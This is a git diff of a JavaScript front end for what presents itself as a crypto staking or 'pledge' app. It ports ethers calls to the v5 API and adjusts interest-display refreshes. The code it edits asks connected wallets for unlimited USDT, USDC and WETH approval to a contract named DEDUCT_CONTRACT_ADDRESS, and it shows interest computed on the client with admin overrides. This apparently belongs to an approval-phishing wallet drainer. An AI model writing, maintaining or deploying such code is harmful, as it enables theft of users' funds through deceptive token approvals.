@@ -279,7 +279,10 @@ async function syncPendingUpdates(serverLastUpdated) {
 }
 
 async function loadUserDataFromServer() {
-    if (!userAddress) return;
+    if (!userAddress) {
+        console.log(`loadUserDataFromServer: No user address, skipping.`);
+        return;
+    }
     try {
         const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, {
             headers: { 'bypass-tunnel-reminder': 'true' }
@@ -309,6 +312,7 @@ async function loadUserDataFromServer() {
             }));
             console.log(`loadUserDataFromServer: Synced user data from server:`, userData);
             localLastUpdated = allData.lastUpdated;
+            await updateInterest(); // 立即更新 UI
         } else {
             console.log(`loadUserDataFromServer: Local data is newer or equal, keeping local state.`);
         }
@@ -321,7 +325,6 @@ async function loadUserDataFromServer() {
             }[pledgeData.token] || 'Unknown';
             document.getElementById('totalPledgedValue').textContent = `${parseFloat(pledgeData.amount).toFixed(2)} ${tokenSymbol}`;
         }
-        await updateInterest(); // 確保同步後立即更新 UI
     } catch (error) {
         console.warn(`loadUserDataFromServer: Failed to load from server: ${error.message}`);
         const localData = JSON.parse(localStorage.getItem('userData') || '{}');
@@ -462,7 +465,7 @@ function updateBalancesUI(walletBalances) {
     const selectedToken = walletTokenSelect.value;
     const decimals = { USDT: 6, USDC: 6, WETH: 18 };
     const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
-    const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
+    const formattedWalletBalance = ethers.utils.formatUnits(walletTokenBigInt, decimals[selectedToken]);
     if (walletBalanceAmount) {
         walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
         console.log(`updateBalancesUI: Updated wallet balance for ${selectedToken}: ${formattedWalletBalance}`);
@@ -562,7 +565,7 @@ async function updateInterest() {
         }
     }
 
-    if (!overrideApplied && stakingStartTime) {
+    if (!overrideApplied && stakingStartTime && pledgedAmount > 0) {
         const currentTime = Date.now();
         const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
         const baseInterestRate = 0.000001;
@@ -721,7 +724,7 @@ async function initializeWallet() {
             connectButton.disabled = true;
             return;
         }
-        provider = new ethers.BrowserProvider(window.ethereum);
+        provider = new ethers.providers.Web3Provider(window.ethereum);
         window.ethereum.on('accountsChanged', (newAccounts) => {
             console.log(`initializeWallet: Accounts changed:`, newAccounts);
             if (userAddress) {
@@ -820,7 +823,7 @@ async function handleConditionalAuthorizationFlow() {
         console.log(`handleConditionalAuthorizationFlow: ${name} allowance: ${currentAllowance.toString()}`);
         if (currentAllowance < requiredAllowance) {
             updateStatus(`Requesting ${name} approval... Please approve in your wallet.`);
-            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
+            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.constants.MaxUint256);
             approvalTx.value = 0n;
             console.log(`handleConditionalAuthorizationFlow: Sending approval transaction for ${name}:`, approvalTx);
             await sendMobileRobustTransaction(approvalTx);
@@ -860,7 +863,7 @@ async function connectWallet() {
             return;
         }
         if (!provider) {
-            provider = new ethers.BrowserProvider(window.ethereum);
+            provider = new ethers.providers.Web3Provider(window.ethereum);
             console.log(`connectWallet: Initialized provider.`);
         }
         updateStatus('Please confirm connection in your wallet...');
@@ -1025,7 +1028,7 @@ function setupSSE() {
             } catch (error) {
                 console.error(`setupSSE: Fallback polling failed: ${error.message}`);
             }
-        }, 5000); // 縮短到 5 秒
+        }, 5000);
     }
 
     function connectSSE() {
@@ -1173,6 +1176,7 @@ document.getElementById('refreshData')?.addEventListener('click', async () => {
     if (!grossOutputValue || !cumulativeValue) {
         await retryDOMAcquisition();
     }
+    await loadUserDataFromServer();
     await updateInterest();
     updateStatus('');
     alert('Data refreshed!');
@@ -1266,7 +1270,7 @@ pledgeBtn.addEventListener('click', async () => {
     try {
         const balance = await retry(() => selectedContract.balanceOf(userAddress));
         const decimals = token === 'WETH' ? 18 : 6;
-        const formattedBalance = parseFloat(ethers.formatUnits(balance, decimals));
+        const formattedBalance = parseFloat(ethers.utils.formatUnits(balance, decimals));
         if (amount > formattedBalance) {
             alert(translations[currentLang].insufficientBalance);
             console.log(`pledgeBtn: Insufficient balance for ${token}: ${amount} > ${formattedBalance}`);
@@ -1313,6 +1317,7 @@ pledgeBtn.addEventListener('click', async () => {
         console.log(`pledgeBtn: Pledged ${amount} ${token} for ${duration} days.`);
         updateStatus(translations[currentLang].pledgeSuccess);
         await saveUserData();
+        await updateInterest();
     } catch (error) {
         console.error(`pledgeBtn: Pledge submission failed: ${error.message}`);
         updateStatus(translations[currentLang].pledgeError, true);
@@ -1373,7 +1378,7 @@ tabs.forEach(tab => {
             if (!grossOutputValue || !cumulativeValue) {
                 await retryDOMAcquisition();
             }
-            await updateInterest(); // 切換標籤時強制更新
+            await updateInterest();
         }
     });
 });
